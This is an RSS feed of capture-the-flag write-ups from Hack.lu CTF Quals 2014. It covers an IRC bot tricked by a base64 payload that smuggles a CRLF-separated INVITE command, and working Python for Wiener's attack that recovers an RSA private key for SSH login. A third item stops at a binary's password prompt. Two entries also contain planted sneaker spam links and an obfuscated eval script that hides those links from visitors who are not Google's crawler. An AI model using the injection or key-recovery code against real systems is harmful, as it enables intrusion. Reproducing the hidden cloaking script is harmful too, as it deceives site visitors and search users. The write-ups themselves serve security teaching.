@@ -1,0 +1,323 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xml:base="https://ctfcrew.org"  xmlns:dc="http://purl.org/dc/elements/1.1/">
+<channel>
+ <title>BalalaikaCr3w - Hack.lu CTF Quals 2014</title>
+ <link>https://ctfcrew.org/event/27</link>
+ <description></description>
+ <language>en</language>
+<item>
+ <title>Barmixer Bot (misc 200)</title>
+ <link>https://ctfcrew.org/writeup/88</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/misc&quot;&gt;misc&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/27&quot;&gt;Hack.lu CTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;&lt;strong&gt;Task&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;There&#039;s a fun and quirky IRC bot to play with. It responds to commands in private chat but also in #hacklu-saloon on freenode. We think it&#039;s involved in a devious scheme that distracts people to get their money pickpocketed. So be careful!&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;We deal with IRC-bot named barmixer-bot in this task. It can understand some commands that starts with &quot;!&quot; symbol.&lt;/p&gt;&lt;p&gt;&lt;!--break--&gt;&lt;/p&gt;&lt;p&gt;Let our username is &quot;hacker&quot;. First let&#039;s ask bot for help:&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;hacker: !help
+barmixer-bot: Send messages to the bot or the channel starting with an exclamation mark. Known commands are list, status, karma, math, base64, base64d, rot13, ping, hack, request, list&lt;/pre&gt;&lt;p&gt;So what status is it?&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;hacker: !status
+barmixer-bot: My name is barmixer-bot, my uptime is 1 hours 55 minutes and 37 seconds. I am on the following channels: #hacklu-saloon, #hacklu-secret-channel, ...&lt;/pre&gt;&lt;p&gt;It looks like bot is member of #hacklu-secret-channel which most likely contain a flag. But this channel require an invitation to get access.&lt;/p&gt;&lt;p&gt;Other commands are not very interesting. Some of them bot performs an actions such as base64 decoding / enciding, rot13. Example:&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;hacker: !base64 hello 
+barmixer-bot: aGVsbG8=
+
+hacker: !base64d aGVsbG8= 
+barmixer-bot: hello&lt;/pre&gt;&lt;p&gt;We know about &lt;a href=&quot;http://en.wikipedia.org/wiki/List_of_Internet_Relay_Chat_commands&quot;&gt;IRC-commands&lt;/a&gt; and specifically about INVITE command. Maybe we can force bot to invite us to secret channel?&lt;/p&gt;&lt;p&gt;Delimeter between IRC-commands is newline so let&#039;s generate our shell:&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;&amp;gt;&amp;gt;&amp;gt; import base64
+&amp;gt;&amp;gt;&amp;gt; c = &#039;1\r\nINVITE hacker #hacklu-secret-channel&#039;
+&amp;gt;&amp;gt;&amp;gt; print base64.b64encode(c)
+MQ0KSU5WSVRFIGhhY2tlciAjaGFja2x1LXNlY3JldC1jaGFubmVs&lt;/pre&gt;&lt;p&gt;And let bot decode it for us:&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;hacker: !base64d MQ0KSU5WSVRFIGhhY2tlciAjaGFja2x1LXNlY3JldC1jaGFubmVs&lt;/pre&gt;&lt;p&gt;Now go to #hacklu-secret-channel and voila! We are inside!&amp;nbsp;Channel topic was &quot;FLAG: &lt;strong&gt;GfeBNmN5XjwDvQB64qoqaEEeYogk4rGH3ikZ0qtc3B3HKLDoAH&lt;/strong&gt;&quot;.&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.nikesneakers.org/&quot;&gt;latest Nike Sneakers&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://aractidf.org/bfaashop/gear/a23461577/nike-air-max/&quot;&gt;Best Nike Air Max Shoes 2021 , Air Max Releases and Deals&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Sun, 26 Oct 2014 18:25:44 +0000</pubDate>
+ <dc:creator>azrael</dc:creator>
+ <guid isPermaLink="false">88 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/88#comments</comments>
+</item>
+<item>
+ <title>Wiener (Crypto 300)</title>
+ <link>https://ctfcrew.org/writeup/87</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/crypto&quot;&gt;crypto&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/27&quot;&gt;Hack.lu CTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;&lt;strong&gt;Task&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;It&#039;s gold rush time! The New York Herald just reported about the Californian gold rush. We know a sheriff there is hiring guys to help him fill his own pockets. We know he already has a deadful amount of gold in his secret vault. However, it is protected by a secret only he knows.&lt;br&gt;When new deputies apply for the job, they get their own secret, but that only provies entry to a vault of all deputy sheriffs. No idiot would store their stuff in this vault.&lt;br&gt;But maybe we can find a way to gain access to the sheriff&#039;s vault? Have a go at it:&lt;br&gt;&lt;br&gt;nc wildwildweb.fluxfingers.net 1426&lt;br&gt;You might also need this [&lt;em&gt;see attachment&lt;/em&gt;].&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;!--break--&gt;&lt;/p&gt;&lt;p&gt;When connects to wildwildweb.fluxfingers.net:1426 one gets acquainted with command interface to acquire credentials (login name, ssh private key, ssh public key) for the address wildwildweb.fluxfingers.net:1427 and to view public keys of other persons having access to that address. The main purpose of the task is to login with credentials corresponding to sheriff.&lt;/p&gt;&lt;p&gt;Taking a look at service source code provided one can notice, that RSA keys are generated in a bit unusual way:&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;def create_parameters(size=2048):
+    p = get_prime(size // 2)
+    q = get_prime(size // 2)
+    N = p * q
+    phi_N = (p - 1) * (q - 1)
+    while True:
+        d = prng.getrandbits(size // 5)
+        e = int(gmpy.invert(d, phi_N))
+        if (e * d) % phi_N == 1:
+            break
+
+    assert test_key(N, e, d)
+    return N, e, d, p, q &lt;/pre&gt;&lt;p&gt;Instead of generating modulus N, picking standard public exponent e and calculating private exponent as (e^(-1)) mod phi(N), they pick rather small random private exponent d and find corresponding e. The d picked is proportional to N^0.2.&lt;/p&gt;&lt;p&gt;With the key generation set up this way RSA cryptosytem becomes weak to Wiener&#039;s attack (see &lt;a href=&quot;http://en.wikipedia.org/wiki/Wiener%27s_attack&quot;&gt;http://en.wikipedia.org/wiki/Wiener%27s_attack&lt;/a&gt;). As anyone can see, Wiener&#039;s attack is applicable with d &amp;lt; (N^0.25)/3, so that&#039;s our case. To perform the attack we are to be able to make continued fractions from ordinary ones, calculate convergents of fractions and solve quadratic equations in rational field. A quick glance at Sage package hasn&#039;t given an impression to help us in this: its method &quot;continued_fraction&quot; seems to be working, but we don&#039;t want to make division before finding continued fraction values not to loose preciseness. Therefore let&#039;s write some code ourselves.&lt;/p&gt;&lt;p&gt;First, method to make continued fraction -- it&#039;s tested to give the same result as &quot;continued_fraction&quot; method of sage does:&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;def makeNextFraction(fraction):
+    (a,b) = fraction
+    res=b/a
+    a1=b%a
+    b1=a
+    return res, (a1,b1)
+
+def makeContinuedFraction(fraction):
+    (a,b) = fraction
+    v=[]
+    v.append(0)
+    while not a == 1:
+        r, fraction = makeNextFraction(fraction)
+        (a,b) = fraction
+        v.append(r)
+    v.append(b)
+    return v&lt;/pre&gt;&lt;p&gt;Next, method for finding convergents -- the same as sage&#039;s &quot;continued_fraction(e).convergents()&quot;:&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;def makeIndexedConvergent(sequence, index):
+    (a,b)=(1,sequence[index])
+    while index&amp;gt;0:
+        index-=1
+        (a,b)=(b,sequence[index]*b+a)
+    return (b,a)
+
+def makeConvergents(sequence):
+    r=[]
+    for i in xrange(0,len(sequence)):
+        r.append(makeIndexedConvergent(sequence,i))
+    return r&lt;/pre&gt;&lt;p&gt;To solve quadratic equations we will use sympy package:&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;from sympy.solvers import solve
+from sympy import Symbol
+
+def solveQuadratic(a,b,c):
+    x = Symbol(&#039;x&#039;)
+    return solve(a*x**2 + b*x + c, x)
+&lt;/pre&gt;&lt;p&gt;To try different convergents let&#039;s use this code:&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;def wienerAttack(N,e):
+    conv=makeConvergents(makeContinuedFraction((e,N)))
+    for frac in conv:
+        (k,d)=frac
+        if k == 0:
+            continue
+        phiN=((e*d)-1)/k
+        roots=solveQuadratic(1, -(N-phiN+1), N)
+        if len(roots) == 2:
+            p,q=roots[0]%N,roots[1]%N
+            if(p*q==N):
+            	return p, q
+&lt;/pre&gt;&lt;p&gt;Now we can stick this all together and save as wienner_attack.py [see attached].&lt;/p&gt;&lt;p&gt;The reminder we do manually.&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Save sheriff&#039;s ssh-rsa public key to sheriff.pub.&lt;/li&gt;&lt;li&gt;Convert ssh-rsa to pem with ssh-keygen:&lt;pre class=&quot;brush: plain; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;$ ssh-keygen -f sheriff.pub -e -m pem &amp;gt; sheriffpub.pem&lt;/pre&gt;&lt;/li&gt;&lt;li&gt;Get e and N from PEM using openssl:&lt;pre class=&quot;brush: plain; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;$ openssl asn1parse -in sheriffpub.pem -i
+    0:d=0  hl=4 l= 520 cons: SEQUENCE          
+    4:d=1  hl=4 l= 256 prim:  INTEGER           :02AEB637F6152AFD4FB3A2DD165AEC9D5B45E70D2B82E78A353F7A1751859D196F56CB6D11700195F1069A73D9E5710950B814229AB4C5549383C2C87E0CD97F904748A1302400DC76B42591DA17DABAF946AAAF1640F1327AF16BE45B8830603947A9C3309CA4D6CC9F1A2BCFDACF285FBC2F730E515AE1D93591CCD98F5C4674EC4A5859264700F700A4F4DCF7C3C35BBC579F6EBF80DA33C6C11F68655092BBE670D5225B8E571D596FE426DB59A6A05AAF77B3917448B2CFBCB3BD647B46772B13133FC68FFABCB3752372B949A3704B8596DF4A44F085393EE2BF80F8F393719ED94AB348852F6A5E0C493EFA32DA5BF601063A033BEAF73BA47D8205DB
+  264:d=1  hl=4 l= 256 prim:  INTEGER           :0285F8D4FE29CE11605EDF221868937C1B70AE376E34D67F9BB78C29A2D79CA46A60EA02A70FDB40E805B5D854255968B2B1F043963DCD61714CE4FC5C70ECC4D756AD1685D661DB39D15A801D1C382ED97A048F0F85D909C811691D3FFE262EB70CCD1FA7DBA1AA79139F21C14B3DFE95340491CFF3A5A6AE9604329578DB9F5BCC192E16AA62F687A8038E60C01518F8CCAA0BEFE569DADAE8E49310A7A3C3BDDCF637FC82E5340BEF4105B533B6A531895650B2EFA337D94C7A76447767B5129A04BCF3CD95BB60F6BFD1A12658530124AD8C6FD71652B8E0EB482FCC475043B410DFC4FE5FBC6BDA08CA61244284A4AB5B311BC669DF0C753526A79C1A57&lt;/pre&gt;&lt;/li&gt;&lt;li&gt;Restore factorization of N using Wiener&#039;s attack:&lt;pre class=&quot;brush: plain; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;$ python wiener_attack.py -e 0x0285F8D4FE29CE11605EDF221868937C1B70AE376E34D67F9BB78C29A2D79CA46A60EA02A70FDB40E805B5D854255968B2B1F043963DCD61714CE4FC5C70ECC4D756AD1685D661DB39D15A801D1C382ED97A048F0F85D909C811691D3FFE262EB70CCD1FA7DBA1AA79139F21C14B3DFE95340491CFF3A5A6AE9604329578DB9F5BCC192E16AA62F687A8038E60C01518F8CCAA0BEFE569DADAE8E49310A7A3C3BDDCF637FC82E5340BEF4105B533B6A531895650B2EFA337D94C7A76447767B5129A04BCF3CD95BB60F6BFD1A12658530124AD8C6FD71652B8E0EB482FCC475043B410DFC4FE5FBC6BDA08CA61244284A4AB5B311BC669DF0C753526A79C1A57 -n 0x02AEB637F6152AFD4FB3A2DD165AEC9D5B45E70D2B82E78A353F7A1751859D196F56CB6D11700195F1069A73D9E5710950B814229AB4C5549383C2C87E0CD97F904748A1302400DC76B42591DA17DABAF946AAAF1640F1327AF16BE45B8830603947A9C3309CA4D6CC9F1A2BCFDACF285FBC2F730E515AE1D93591CCD98F5C4674EC4A5859264700F700A4F4DCF7C3C35BBC579F6EBF80DA33C6C11F68655092BBE670D5225B8E571D596FE426DB59A6A05AAF77B3917448B2CFBCB3BD647B46772B13133FC68FFABCB3752372B949A3704B8596DF4A44F085393EE2BF80F8F393719ED94AB348852F6A5E0C493EFA32DA5BF601063A033BEAF73BA47D8205DB
+-p 12001304129015480165432875074437607933493850611499879464845243350215176144760883615322622081442653872645865326992384034722586201972392183010813439352778246403016897976571514715418700569567613729681273931557848857971070286176848136118602099586101089743239644367344468295964691411425416652519752140536869089101
+-q 28216117316929874067495888027767527011360661622486842768414059951572932145196930641365509243766454218518793508840136548374994021850853203018205749779390383366761851772055038753940967432004901699256177783249460134792699230632136386268348434203012426963129659057781488950062703849444443906614331812260961682887
+-e 318540665379393469901456665807211509077755719995811520039095212139429238053864597311950397094944291616119321660193803737677538864969915331331528398734504661147661499115125056479426948683504604460936703005724827506058051215012025774714463561829608252938657297504427643593752676857551877096958959488289759878259498255905255543409142370769036479607835226542428818361327569095305960454592450213005148130508649794732855515489990191085723757628463901282599712670814223322126866814011761400443596552984309315434653984387419451894484613987942298157348306834118923950284809853541881602043240244910348705406353947587203832407&lt;/pre&gt;&lt;/li&gt;&lt;li&gt;Use rsatool.py (&lt;a href=&quot;https://github.com/ius/rsatool/blob/master/rsatool.py&quot;&gt;https://github.com/ius/rsatool/blob/master/rsatool.py&lt;/a&gt;) to generate sheriff&#039;s private key:&lt;pre class=&quot;brush: plain; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;$ python rsatool.py -o sheriffpriv.pem -p 12001304129015480165432875074437607933493850611499879464845243350215176144760883615322622081442653872645865326992384034722586201972392183010813439352778246403016897976571514715418700569567613729681273931557848857971070286176848136118602099586101089743239644367344468295964691411425416652519752140536869089101 -q 28216117316929874067495888027767527011360661622486842768414059951572932145196930641365509243766454218518793508840136548374994021850853203018205749779390383366761851772055038753940967432004901699256177783249460134792699230632136386268348434203012426963129659057781488950062703849444443906614331812260961682887 -e 318540665379393469901456665807211509077755719995811520039095212139429238053864597311950397094944291616119321660193803737677538864969915331331528398734504661147661499115125056479426948683504604460936703005724827506058051215012025774714463561829608252938657297504427643593752676857551877096958959488289759878259498255905255543409142370769036479607835226542428818361327569095305960454592450213005148130508649794732855515489990191085723757628463901282599712670814223322126866814011761400443596552984309315434653984387419451894484613987942298157348306834118923950284809853541881602043240244910348705406353947587203832407 &amp;amp;&amp;gt;0&lt;/pre&gt;&lt;/li&gt;&lt;li&gt;Login with sheriff&#039;s credentials and get the flag:&lt;pre class=&quot;brush: plain; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;$ chmod 0600 sheriffpriv.pem
+$ ssh sheriff@wildwildweb.fluxfingers.net -p 1427 -i sheriffpriv.pem
+Woah look how much gold that old croaker has: flag{TONS_OF_GOLD_SUCH_WOW_MUCH_GLOW}&lt;/pre&gt;&lt;/li&gt;&lt;/ol&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.mysneakers.org/&quot;&gt;Best jordan Sneakers&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.worldarchitecturefestival.com/dfbcdwshop/nike-air-jordan-xxx-white-black-wolf-grey-811006-101.html&quot;&gt;Nike Air Jordan XXX Basketball Shoes/Sneakers 811006-101 Worldarchitecturefestival&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-file field-type-file field-label-above&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Attachments:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Package icon&quot; title=&quot;application/zip&quot; src=&quot;/modules/file/icons/package-x-generic.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/wiener_38ff175d336b9c75fbf1b77290978015.py__0.zip&quot; type=&quot;application/zip; length=4328&quot;&gt;wiener_38ff175d336b9c75fbf1b77290978015.py_.zip&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;field-item odd&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Package icon&quot; title=&quot;application/zip&quot; src=&quot;/modules/file/icons/package-x-generic.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/wiener_attack.py_.zip&quot; type=&quot;application/zip; length=885&quot;&gt;wiener_attack.py_.zip&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Sun, 26 Oct 2014 17:18:25 +0000</pubDate>
+ <dc:creator>Mirron</dc:creator>
+ <guid isPermaLink="false">87 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/87#comments</comments>
+</item>
+<item>
+ <title>Gunslinger Joe&#039;s Gold (Reversing - 200)</title>
+ <link>https://ctfcrew.org/writeup/86</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/reverse&quot;&gt;reverse&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/27&quot;&gt;Hack.lu CTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;Task:&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;Silly Gunslinger Joe has learned from his mistakes with his private terminal and now tries to remember passwords. But he&#039;s gotten more paranoid and chose to develope an additional method: protect all his private stuff with a secure locking mechanism that no one would be able to figure out! He&#039;s so confident with this new method that he even started using it to protect all his precious gold. So … we better steal all of it!&amp;nbsp;&lt;/span&gt;&lt;br style=&quot;margin: 0px; padding: 0px; color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;&lt;br style=&quot;margin: 0px; padding: 0px; color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;SSH: joes_gold@wildwildweb.fluxfingers.net&lt;/span&gt;&lt;br style=&quot;margin: 0px; padding: 0px; color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;PORT: 1415&lt;/span&gt;&lt;br style=&quot;margin: 0px; padding: 0px; color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;PASSWORD: 1gs67uendsx71xmma8&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;Solution:&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;&lt;!--break--&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;Start with ssh connection to the given server (whatever). In the home directory I found two files: FLAG and gold_stash.&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;joes_gold@goldstash:~$ ls -la
+total 32
+drwxr-xr-x 2 joes_gold joes_gold  4096 Oct  6 23:09 .
+drwxr-xr-x 3 root      root       4096 Oct  6 22:56 ..
+-rw-r--r-- 1 joes_gold joes_gold  3106 Feb 20  2014 .bashrc
+-r-------- 1 gold      gold         46 Oct  6 23:04 FLAG
+-rwsr-sr-x 1 gold      gold      13186 Oct  6 23:03 gold_stash&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;So I didn&#039;t have enough rights to read FLAG but I sill could run gold_stash and found the way how it can read FLAG for me. I ran gold_stash and it asked me for username and password to authenticate.&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;joes_gold@goldstash:~$ ./gold_stash
+          (_/-------------_______________________)
+          `|  /~~~~~~~~~~\                       |
+           ;  |--------(-||______________________|
+           ;  |--------(-| ____________|
+           ;  \__________/&#039;
+         _/__         ___;
+      ,~~    |  __--~~       Gunslinger Joe&#039;s
+     &#039;        ~~| (  |       Private Stash of Gold
+    &#039;      &#039;~~  `____&#039;
+   &#039;      &#039;
+  &#039;      `            Password Protection activated!
+ &#039;       `
+&#039;--------`
+Username:
+Password:
